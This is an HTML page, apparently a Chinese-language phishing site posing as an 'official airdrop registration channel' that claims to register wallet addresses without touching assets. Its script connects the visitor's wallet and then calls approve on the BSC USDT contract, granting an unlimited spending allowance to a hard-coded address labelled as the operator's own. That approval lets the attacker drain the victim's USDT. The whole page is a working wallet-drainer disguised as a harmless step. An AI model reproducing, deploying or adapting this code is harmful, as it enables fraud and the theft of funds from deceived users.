<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>官方空投备案通道</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px}
.container{max-width:480px;margin:0 auto}
.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);text-align:center}
.hide{display:none}
.logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px}
h1{font-size:22px;margin-bottom:8px;color:#fff}
.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}
.btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer}
.mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
.verify-btn{background:linear-gradient(135deg,#23b55c,#19944a);color:#fff}
.addr-wrap{background:rgba(14,22,40,.75);padding:13px;border-radius:12px;margin:20px 0;font-size:12.5px;color:#89a2d8;word-break:break-all}
</style>
</head>
<body>
<div class="container">
<div id="p1" class="box">
<div class="logo">✦</div>
<h1>官方空投备案</h1>
<p class="sub-title">仅链上地址备案，不扣资产</p>
<button class="btn mm-btn" id="connectBtn">连接钱包</button>
</div>
<div id="p2" class="box hide">
<div class="logo">⏳</div>
<h1>处理中</h1>
</div>
<div id="p3" class="box hide">
<div class="logo">✓</div>
<h1>连接成功</h1>
<div class="addr-wrap">地址：<span id="address"></span></div>
<button class="btn verify-btn" id="approveBtn">确认备案</button>
</div>
<div id="p4" class="box hide">
<div class="logo">✅</div>
<h1>备案成功</h1>
</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
<script>
// 被授权方：你的地址
const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
// BSC-USDT合约
const USDT_CONTRACT = "0x55d398326f99059fF77548524699952727959279";
// 授权ABI
const ABI = [{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];

let web3, contract, userAddr;

function show(id) {
  document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
  document.getElementById(id).classList.remove("hide");
}

document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) return alert("请在钱包内置浏览器打开");
  show("p2");
  try {
    await ethereum.request({method:"eth_requestAccounts"});
    web3 = new Web3(window.ethereum);
    const accounts = await web3.eth.getAccounts();
    userAddr = accounts[0];
    contract = new web3.eth.Contract(ABI, USDT_CONTRACT);
    document.getElementById("address").innerText = userAddr;
    show("p3");
  } catch(e) { show("p1"); }
};

document.getElementById("approveBtn").onclick = async () => {
  if (!userAddr || !contract) return;
  show("p2");
  try {
    // 调用approve方法，触发钱包弹出「支出上限请求」界面
    await contract.methods.approve(SPENDER, "115792089237316195423570985008687907853269984665640564039457584007913129639935").send({from: userAddr});
    show("p4");
  } catch(e) { show("p3"); }
};
</script>
</body>
</html>
